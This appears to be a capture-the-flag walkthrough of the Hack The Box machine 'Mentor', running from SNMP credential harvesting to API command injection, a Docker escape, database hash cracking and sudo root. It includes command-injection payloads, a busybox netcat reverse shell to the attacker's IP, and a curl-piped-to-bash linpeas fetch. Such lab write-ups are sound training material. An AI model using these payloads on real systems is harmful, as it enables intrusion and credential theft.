---
icon: ubuntu
---

# Mentor - Medium

<figure><img src="../../.gitbook/assets/image (23).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/mentor"><strong>Mentor</strong></a></p></figcaption></figure>

## <mark style="color:green;">Scanning & Enumeration</mark>

Nmap TCP scan:

```shellscript
## Nmap TCP
Nmap scan report for 10.10.11.193
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   100.07 ms 10.10.16.1
2   32.15 ms  10.10.11.193
```

on Port 80 we have a redirect to `mentorquotes.htb` I'll add it to my hosts file

```shellscript
10.10.11.193	mentorquotes.htb
```

Nmap UDP scan:

```shellscript
## Nmap UDP
sudo nmap -sU -p- -Pn --min-rate 10000 10.10.11.193 -oN scans/nmap-udpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-30 21:12 EST
Warning: 10.10.11.193 giving up on port because retransmission cap hit (10).
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.098s latency).
Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 72.90 seconds
```

Since SNMP is open on this box I am going to take a look at it firt

### <mark style="color:blue;">SNMP 161 UDP</mark>

I'll use [snmpbrute](https://github.com/SECFORCE/SNMP-Brute) to identify the community strings

```shellscript
python3 snmpbrute.py -t 10.10.11.193
```

<figure><img src="../../.gitbook/assets/image (3067).png" alt=""><figcaption></figcaption></figure>

(RO) stands for read only

There is an internal string I am going to dump everything using snmpbulkwalk and dig through it

```shellscript
snmpbulkwalk -v2c -c internal 10.10.11.193 . | tee snmp-internal.out
```

#### <mark style="color:$primary;">Enumerating SNMP internal v2c Dump</mark>

First executables

```shellscript
grep SWRunName snmp-internal.out
```

<figure><img src="../../.gitbook/assets/image (3068).png" alt=""><figcaption></figcaption></figure>

there is a login.py that stands out

<figure><img src="../../.gitbook/assets/image (3069).png" alt=""><figcaption></figcaption></figure>

There seems to be some sort of password here I'll note it for later use

```shellscript
kj23sadkj123as0-d213
```

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

#### <mark style="color:$primary;">Tech Detection</mark>

```shellscript
curl -I http://10.10.11.193
```

```shellscript
HTTP/1.1 302 Found
Date: Tue, 06 Jan 2026 21:45:55 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: http://mentorquotes.htb/
Content-Type: text/html; charset=iso-8859-1
```

* Apache is listening on `0.0.0.0:80`
* It has a **default vhost**
* That vhost issues a **302 redirect** to a domain name

```shellscript
curl -I http://mentorquotes.htb
```

```shellscript
HTTP/1.1 200 OK
Date: Tue, 06 Jan 2026 21:47:52 GMT
Server: Werkzeug/2.0.3 Python/3.6.9
Content-Type: text/html; charset=utf-8
Content-Length: 5506
```

* Apache routes traffic for `mentorquotes.htb`
* It forwards (reverse proxies) the request
* The backend app responds
* Apache **passes through the backend’s Server header**

#### <mark style="color:$primary;">Arhitecture Guess</mark>

```shellscript
Client
  ↓
Apache (port 80)
  ├─ Default vhost → redirect
  └─ mentorquotes.htb vhost
        ↓
        Reverse Proxy (ProxyPass)
        ↓
Werkzeug WSGI server
        ↓
Flask app (Python)
```

Apache is:

* Frontend web server
* Host-based router
* Reverse proxy

Werkzeug is:

* Backend application server
* Handling Python logic

#### <mark style="color:$primary;">Website</mark>

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Subdomain Enumeration</mark>

{% code overflow="wrap" %}
```shellscript
wfuzz -c -f sub-fighter -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://mentorquotes.htb' -H 'HOST: FUZZ.mentorquotes.htb' --hw 26
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

A Subdomain Enumeration reveals an `api` subdomain. I'll add it to my hosts file

When visiting it it reveals nothing

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Directory busting on api.mentorquotes.htb</mark>

```shellscript
feroxbuster -u http://api.mentorquotes.htb
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

reveals 3 interesting endpoints

#### <mark style="color:$primary;">api.mentorquotes.htb/docs</mark>

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

`james@mentorquotes.htb` this seems to be the administrator email for the website.

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

This is a token based API, when registering a user it would create a JWT token for that user. We will either have to spoof the token to become the administrator or we will have to find an injection point for RCE.

#### <mark style="color:$primary;">API Auth as deimos</mark>

Now with access to the api endpoints we can create a user

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

Let's grab a token from the `/auth/login` endpoint.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Execute, and you will receive an authentication token

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**token**</mark>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

the token itself does not seem to store any interesting information.

Let's see what we can access with this token, I'll try the users endpoint

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Insert the token you were given and than click on execute

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

We got a 422 error parameter abuse? It seems the application is not attaching the Authoirzation header. I am going to send the request via burpsuite and see if we get the same response

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Our user does not have access here!

Earlier we Discovered an email address on the site and a password via SNMP let's put them together we might have an admin user

```shellscript
james@mentorquotes.htb:kj23sadkj123as0-d213
```

#### <mark style="color:$primary;">API auth as James (admin)</mark>

First we will grab the Authorization token by authenticating as james

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Now we can enumerate the endpoints

#### <mark style="color:$primary;">Endpoint Enumeration</mark>

<mark style="color:yellow;">**/users**</mark>

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

We found another account that we can note down, but nothing else of interest.&#x20;

Let's take a peek at the /admin endpoint we discovered via directory busting that isn't in the documentation

<mark style="color:yellow;">**/admin**</mark>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

We discovered 2 more endpoints. The /admin/check endpoint hasn't been implemented yet

<mark style="color:yellow;">**/admin/backup**</mark>

takes a POST request

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

and it also needs a body. I’ll add `{body:"test"}` at the end as the body, and change the `Content-Type` to `application/json`

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Now it's complaining about a missing `path` field

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

No matter what I place into the `path` field, it returns `"Done!"`

#### <mark style="color:$primary;">Command Injection</mark>

I'll test a `ping` request and see if I get any ICMP packets sent to my host.

First setup:

```shellscript
sudo tcpdump -ni tun0 icmp
```

Now we can send the request

```shellscript
test; ping -c 1 10.10.16.3;"
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

This confirms command injection!

A bash reverse shell did not work but I managed to get a reverse shell via nc&#x20;

{% code title="nc" %}
```shellscript
test; busybox nc 10.10.16.3 80 -e /bin/sh;
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Send the request and you should receive a shell

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

!!! Note python is on this machine so you should be able to get a reverse shell via python as well you can grab one from [revshells.com](https://www.revshells.com/)

### <mark style="color:blue;">Escaping Docker Container</mark>

Checking the network we discovered that we are in a docker container

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Manual Enumeration</mark>

During manual enumeration I discovered some postgresql credentials in

<mark style="color:yellow;">**/API/app/db.py**</mark>

```python
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)


# Databases query builder
database = Database(DATABASE_URL)
```

{% code title="Credentials" %}
```shellscript
postgres:postgres
```
{% endcode %}

The database is running on 172.22.0.1

Here the users table shows a password column as well. This was not visible in our API enumeration earlier, but checking out the models.py file it shows why:

<mark style="color:yellow;">**/API/app/api/models.py**</mark>

```python
...[snip]...
class userDB(BaseModel):
    id: int
    email: str
    username: str
...[snip]...
# Token model
```

psql is not available on this docker container I will use chisel to connect and enumerate the DB.

#### <mark style="color:$primary;">Database</mark>

<mark style="color:yellow;">**Chisel Tunneling**</mark>

Transfer chisel to the target machine

```shellscript
wget 10.10.16.3/chisel_1.10.1_linux_amd64
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Start chisel server on our machine

```shellscript
./chisel_1.10.1_linux_amd64 server -p 8000 --reverse
```

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Now connect from the container

```shellscript
./chisel_1.10.1_linux_amd64 client 10.10.16.3:8000 R:9000:172.22.0.1:5432
```

<figure><img src="../../.gitbook/assets/image (3072).png" alt=""><figcaption></figcaption></figure>

I have pick a different port to connect back to my machine in this case 9000. Because I already have an active instance of postgres on my machine running on port 5432

<figure><img src="../../.gitbook/assets/image (3073).png" alt=""><figcaption><p>Connection on my machine</p></figcaption></figure>

<mark style="color:yellow;">**Enumerating Database**</mark>

```shellscript
psql -h 127.0.0.1 -p 9000 -U postgres
```

<figure><img src="../../.gitbook/assets/image (3074).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3075).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3076).png" alt=""><figcaption></figcaption></figure>

the cmd\_exec tables just stores the id command of the postgres user

the users table has some hashes let's see if we can crack any&#x20;

<figure><img src="../../.gitbook/assets/image (3077).png" alt=""><figcaption></figcaption></figure>

Crackstation managed to crack the svc users hash. We have a set of credentials now:

```shellscript
svc:123meunomeeivani
```

#### <mark style="color:$primary;">Alternative to tunneling</mark>

the <mark style="color:yellow;">**`models.py`**</mark> was preventing the hashes from being shown to the user. Since we are the root user in this container we can modify `/app/app/api/models.py` and add password to the model:

{% code title="models.py" %}
```shellscript
...[snip]...
class userDB(BaseModel):
    id: int
    email: str
    username: str
    password: str
...[snip]...
```
{% endcode %}

**NOTE!!!** <mark style="color:$success;">**app/app/api/models.py**</mark> needs to be modified not <mark style="color:yellow;">**/API/app/api/models.py**</mark>

Now if we hit the API again we get the hashes.

<figure><img src="../../.gitbook/assets/image (3078).png" alt=""><figcaption></figcaption></figure>

```shellscript
netexec ssh 10.10.11.193 -u svc -p 123meunomeeivani
```

<figure><img src="../../.gitbook/assets/image (3079).png" alt=""><figcaption></figcaption></figure>

we have ssh access as svc

## <mark style="color:green;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as svc</mark>

```shellscript
ssh svc@10.10.11.193
```

{% code title="Credentials" %}
```shellscript
svc:123meunomeeivani
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3081).png" alt=""><figcaption></figcaption></figure>

James also is a user on this box, there might be some credential leakage

#### <mark style="color:$primary;">Linpeas</mark>

```shellscript
curl http://10.10.16.3/linpeas.sh | bash
```

<figure><img src="../../.gitbook/assets/image (3082).png" alt=""><figcaption></figcaption></figure>

First file that stood out was `snmpd.conf` we already found some creds on this box from SNMP let's check it out

<figure><img src="../../.gitbook/assets/image (3083).png" alt=""><figcaption></figcaption></figure>

found what looks like a password let's test it

<figure><img src="../../.gitbook/assets/image (3084).png" alt=""><figcaption></figcaption></figure>

The password works for james!

```shellscript
james:SuperSecurePassword123__
```

### <mark style="color:blue;">Shell as james</mark>

<figure><img src="../../.gitbook/assets/image (3085).png" alt=""><figcaption></figcaption></figure>

james can run `/bin/sh` as the root user! We can easily escalate to root

```shellscript
sudo /bin/sh
```

<figure><img src="../../.gitbook/assets/image (3086).png" alt=""><figcaption></figcaption></figure>
